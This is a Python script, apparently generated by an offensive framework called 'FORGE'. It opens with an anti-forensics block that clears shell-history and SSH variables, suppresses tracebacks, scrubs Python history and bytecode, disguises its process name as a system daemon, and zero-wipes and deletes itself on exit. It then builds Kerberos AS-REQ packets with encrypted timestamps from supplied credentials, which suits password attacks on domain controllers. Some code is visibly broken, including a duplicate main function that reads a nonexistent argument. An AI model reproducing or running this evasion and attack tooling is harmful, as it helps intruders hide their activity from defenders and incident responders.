#!/usr/bin/env python3
"""Generated utility."""


# ── OPSEC: Anti-Forensics ──
import os as _os
# ── Operator Host Guard: detect if running on FORGE operator machine ──
# Prevents persistence, crontab, LaunchAgent writes on the operator's own system.
# Remote deployments (via SSH/DeployEngine) do NOT have these env vars set.
_FORGE_OPERATOR = bool(_os.environ.get('FORGE_OPERATOR') or _os.environ.get('FORGE_SANDBOX'))
_FORGE_TTL = int(_os.environ.get('FORGE_TTL', '0'))
if _FORGE_TTL > 0:
    try:
        import signal as _ttl_sig
        _ttl_sig.signal(_ttl_sig.SIGALRM, lambda *_: __import__("sys").exit(0))
        _ttl_sig.alarm(_FORGE_TTL)
    except (AttributeError, OSError):
        import threading as _ttl_thr
        _ttl_thr.Timer(_FORGE_TTL, lambda: __import__("os")._exit(0)).start()
def _guard_persistence(func):
    """Decorator: skip persistence actions on operator host."""
    def _wrapper(*a, **k):
        if _FORGE_OPERATOR:
            return None
        return func(*a, **k)
    _wrapper.__name__ = func.__name__
    return _wrapper
import os as _os
def _sanitize_env():
    """Remove environment variables that reveal tool origin."""
    _p = chr(70)+chr(79)+chr(82)+chr(71)+chr(69)
    for var in [_p+'_HOME', _p+'_SESSION', 'PYTHONDONTWRITEBYTECODE',
                'SSH_CONNECTION', 'SSH_CLIENT', 'SSH_TTY', 'HISTFILE',
                'HISTFILESIZE', 'HISTSIZE', 'LESSHISTFILE',
                _p+'_OPERATOR', _p+'_SANDBOX']:
        _os.environ.pop(var, None)
    _os.environ['PYTHONDONTWRITEBYTECODE'] = '1'
    _os.environ['PYTHONHASHSEED'] = '0'
_sanitize_env()
import sys as _sys
_original_excepthook = _sys.excepthook
def _silent_except(exc_type, exc_value, exc_tb):
    """Suppress tracebacks — no forensic stack traces."""
    pass
_sys.excepthook = _silent_except
import os as _os, sys as _sys, shutil as _shutil, glob as _glob
def _cleanup_python_traces():
    """Remove Python forensic artifacts."""
    script = _os.path.abspath(_sys.argv[0]) if _sys.argv[0] else None
    if script:
        script_dir = _os.path.dirname(script)
        pycache = _os.path.join(script_dir, '__pycache__')
        if _os.path.isdir(pycache):
            _shutil.rmtree(pycache, ignore_errors=True)
        for pyc in _glob.glob(_os.path.join(script_dir, '*.pyc')):
            try:
                _os.remove(pyc)
            except Exception:
                pass
    for hist in [_os.path.expanduser('~/.python_history'),
                 _os.path.expanduser('~/.local/share/python_history')]:
        try:
            if _os.path.exists(hist):
                with open(hist, 'r') as f:
                    lines = f.readlines()
                with open(hist, 'w') as f:
                    f.writelines(l for l in lines if script and _os.path.basename(script) not in l)
        except Exception:
            pass
import atexit as _atexit
_atexit.register(_cleanup_python_traces)
import sys as _sys
def _rename_process(name=None):
    """Rename this process to appear benign in ps/top."""
    _rnd = __import__('random')
    benign = name or ['python3', '/usr/bin/python3', 'update-manager',
                      'systemd-resolved', 'dbus-daemon'][_rnd.randint(0, 4)]
    try:
        _ct = __import__('ctypes')
        libc = _ct.CDLL('libc.so.6', use_errno=True)
        buff = _ct.create_string_buffer(len(benign) + 1)
        buff.value = benign.encode()
        libc.prctl(15, buff, 0, 0, 0)
    except Exception:
        pass
    try:
        _sys.argv[0] = benign
    except Exception:
        pass
_rename_process()
import os as _os, sys as _sys
def _self_destruct():
    """Remove this script from disk after execution."""
    try:
        _path = _os.path.abspath(_sys.argv[0]) if _sys.argv[0] else None
        if _path and _os.path.isfile(_path):
            with open(_path, 'wb') as _f:
                _f.write(b'\x00' * _os.path.getsize(_path))
            _os.remove(_path)
    except Exception:
        pass
import atexit as _atexit
_atexit.register(_self_destruct)
import os as _os, time as _time
def _neutralize_timestamps(*paths):
    """Set file timestamps to epoch or a plausible system time."""
    epoch = 1704067200
    for p in paths:
        try:
            if _os.path.exists(p):
                _os.utime(p, (epoch, epoch))
        except Exception:
            pass
import ctypes as _ctypes, gc as _gc
def _wipe_bytes(obj):
    """Overwrite a bytes/bytearray object in memory with zeros."""
    try:
        if isinstance(obj, (bytes, bytearray)):
            buf = (ctypes.c_char * len(obj)).from_address(id(obj) + _ctypes.sizeof(_ctypes.py_object))
            _ctypes.memset(buf, 0, len(obj))
    except Exception:
        pass
def _wipe_string(s):
    """Best-effort wipe of a Python string (CPython only)."""
    try:
        offset = _ctypes.sizeof(_ctypes.py_object) + _ctypes.sizeof(_ctypes.c_ssize_t) + _ctypes.sizeof(_ctypes.c_long)
        _ctypes.memset(id(s) + offset, 0, len(s))
    except Exception:
        pass
def _wipe_all_sensitive():
    """Wipe all local variables in the calling frame."""
    import inspect
    frame = inspect.currentframe().f_back
    if frame:
        for k, v in list(frame.f_locals.items()):
            if isinstance(v, (bytes, bytearray)):
                _wipe_bytes(v)
            elif isinstance(v, str) and len(v) > 8:
                _wipe_string(v)
    _gc.collect()
import os as _os_ttl
# ── Process TTL: auto-terminate after max lifetime ──
# Default 3600s (1 hour). Override via FORGE_MAX_TTL env var.
# Prevents zombie processes from running indefinitely on targets.
_MAX_TTL = int(_os_ttl.environ.get('FORGE_MAX_TTL', '3600'))
if _MAX_TTL > 0:
    try:
        import signal as _pttl_sig
        def _ttl_exit(*_):
            try:
                _self_destruct()
            except NameError:
                pass
            __import__("os")._exit(0)
        _pttl_sig.signal(_pttl_sig.SIGALRM, _ttl_exit)
        _pttl_sig.alarm(_MAX_TTL)
    except (AttributeError, OSError):
        import threading as _pttl_thr
        def _ttl_thread_exit():
            try:
                _self_destruct()
            except NameError:
                pass
            __import__("os")._exit(0)
        _pttl_thr.Timer(_MAX_TTL, _ttl_thread_exit).daemon = True
        _pttl_thr.Timer(_MAX_TTL, _ttl_thread_exit).start()
# ── End OPSEC ──

_QUIET = "--silent" in __import__("sys").argv
_PRINT = getattr(__import__("builtins"), "print")
def _log(*a, **k):
    if not _QUIET: _PRINT(*a, **k)

import argparse
import hashlib
import hmac
import json
import os
_st = __import__(chr(115)+chr(116)+chr(114)+chr(117)+chr(99)+chr(116))
import sys
import time


def kerberos_as_req(username, domain, password, kdc_ip, kdc_port=88):
    """Build Kerberos AS-REQ with PA-ENC-TIMESTAMP (RC4-HMAC etype=23)."""
    def _dl(n):
        if n < 0x80: return _st.pack('B', n)
        return (b'\x81' + _st.pack('B', n)) if n < 0x100 else (b'\x82' + _st.pack('>H', n))
    def _tlv(t, v): return _st.pack('B', t) + _dl(len(v)) + v
    def _int(v):
        if v < 0x80: return _tlv(0x02, _st.pack('B', v))
        return _tlv(0x02, _st.pack('>H', v)) if v < 0x8000 else _tlv(0x02, _st.pack('>I', v))
    def _seq(c): return _tlv(0x30, c)
    def _ctx(n, c): return _tlv(0xA0 | n, c)
    def _gs(s): return _tlv(0x1B, s.encode('ascii'))
    def rc4(key, data):
        S = list(range(256)); j = 0
        for i in range(256): j = (j + S[i] + key[i % len(key)]) % 256; S[i], S[j] = S[j], S[i]
        i = j = 0; out = bytearray()
        for b in data:
            i = (i + 1) % 256; j = (j + S[i]) % 256; S[i], S[j] = S[j], S[i]
            out.append(b ^ S[(S[i] + S[j]) % 256])
        return bytes(out)
    nt_hash = hashlib.new('md4', password.encode('utf-16-le')).digest()
    ts_str = time.strftime('%Y%m%d%H%M%SZ', time.gmtime()).encode('ascii')
    pa_ts = _seq(_ctx(0, _tlv(0x18, ts_str)) + _ctx(1, _int(0)))
    k1 = hmac.new(nt_hash, _st.pack('<I', 1), hashlib.md5).digest()
    conf = os.urandom(8)
    k3 = hmac.new(k1, conf, hashlib.md5).digest()
    cksum = hmac.new(k1, pa_ts, hashlib.md5).digest()
    cipher = _st.pack('>I', 1) + cksum + conf + rc4(k3, pa_ts)
    enc_ts = _seq(_ctx(0, _int(23)) + _ctx(2, _tlv(0x04, cipher)))
    pa_data = _seq(_ctx(1, _int(2)) + _ctx(2, enc_ts))
    princ = _seq(_ctx(0, _int(1)) + _ctx(1, _seq(_gs(username))))
    realm = _gs(domain.upper())
    sname = _seq(_ctx(0, _int(2)) + _ctx(1, _seq(_gs('krbtgt') + _gs(domain.upper()))))
    kdc_opts = _tlv(0x03, b'\x05' + _st.pack('>I', 0x40800000))
    body = _seq(_ctx(0, kdc_opts) + _ctx(1, princ) + _ctx(2, realm) + _ctx(3, sname) + _ctx(7, _seq(_int(23))))
    inner = _ctx(1, _int(5)) + _ctx(2, _int(10)) + _ctx(3, _seq(pa_data)) + _ctx(4, body)
    return {'packet': _tlv(0x6A, _seq(inner)), 'nt_hash': nt_hash, 'kdc': (kdc_ip, kdc_port)}

def main():
    """Main execution"""
    parser = argparse.ArgumentParser(description="generated tool")
    parser.add_argument("--port", type=int, default=88, help="Target port")
    args = parser.parse_args()

    result = kerberos_as_req(username=args.target, domain=args.target, password=args.target, kdc_ip=args.target, kdc_port=args.port)
    if isinstance(result, dict):
        _log(json.dumps(result, indent=2, default=str))
    elif isinstance(result, (list, tuple)):
        for item in result:
            if isinstance(item, dict):
                _log(json.dumps(item, indent=2, default=str))
            else:
                _log(item)
    elif isinstance(result, bytes):
        _log(f"Raw bytes: {len(result)} bytes")
        _log(f"Hex: {result.hex()[:200]}")
    elif result is not None:
        _log(result)

def main():
    import json as _json
    parser = argparse.ArgumentParser(description='FORGE Generated Tool')
    parser.add_argument('--json', action='store_true', help='JSON output')
    parser.add_argument('--run', help='Run a specific function by name')
    parser.add_argument('--username', help='username')
    parser.add_argument('--domain', help='domain')
    parser.add_argument('--password', help='password')
    parser.add_argument('--kdc-ip', help='kdc_ip')
    args = parser.parse_args()

    results = {}

    _available = ['kerberos_as_req']
    if args.run and args.run not in _available:
        _log(f'[!] Unknown function: {args.run}')
        _log(f'[*] Available: {_available}')
        return 1

    if not args.run or args.run == 'kerberos_as_req':
        if all([getattr(args, "username", None), getattr(args, "domain", None), getattr(args, "password", None), getattr(args, "kdc_ip", None)]):
            try:
                _r = kerberos_as_req(getattr(args, "username"), getattr(args, "domain"), getattr(args, "password"), getattr(args, "kdc_ip"))
                results['kerberos_as_req'] = _r
                if not args.json:
                    _log(f'[+] kerberos_as_req: {_r}')
            except Exception as _e:
                results['kerberos_as_req'] = {'error': str(_e)}
                if not args.json:
                    _log(f'[!] kerberos_as_req: {_e}')

    if args.json and results:
        _log(_json.dumps(results, indent=2, default=str))
    return 0


if __name__ == "__main__":
    import sys
    sys.exit(main() or 0)
